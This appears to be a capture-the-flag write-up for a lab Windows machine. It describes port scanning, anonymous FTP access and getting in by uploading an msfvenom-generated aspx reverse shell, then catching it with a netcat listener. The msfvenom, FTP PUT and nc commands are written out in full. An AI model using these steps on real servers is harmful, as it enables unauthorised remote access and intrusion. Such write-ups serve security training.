## Enumeration:

I started with quick rustscan & observed only 2 open ports 21 & 80.

```bash
sudo rustscan -a 10.10.10.5 -- -sC -sV -vv -oN devel_nmap
```

```
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)

```

So, as per the port & service scan results anonymous logon is allowed in FTP & there is a directory "aspnet_client" present in FTP server. Apart from this there is a webserver running on port 80.

I checked for the web server but didn't found anything except IIS welcome image.

I then performed sub-directory enumeration but even GoBuster didn't revealed any sub-directory.

## Initial access:

I then checked the directory present in the FTP folder by login as an anonymous user.

```bash
FTP -vv 10.10.10.5
```

The directory contains another folder "system_web" & this folder contains another folder "2_0_50727".

After running the sub-directory enumeration twice using GoBuster & FFUF when I didn't get any results.
I then though since there is a directory present in the FTP folder there might be a possibility that these can be accessed from web server as well.
I tried to access the folder "aspnet_client" but got error 403, but this also means this FTP files & directories are available on the web-server as well.

I created a asp based reverse shell using MSFVEOM due to the aspclient running in FTP & uploaded it on the server using PUT command.

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=ip_here LPORT=1337 -e x86/shikata_ga_nai -f aspx -o adv.aspx

PUT dawn.aspx
```

After uploading the aspx binary I turned on my netcat listener on port 1337 & browsed through my uploaded file in web server.

```bash
nc -lnvp 1337
```

Once my file was accessed by the web browser I got reverse shell in my attacker host, runnng as 'IIS web' user. ðŸ™‚
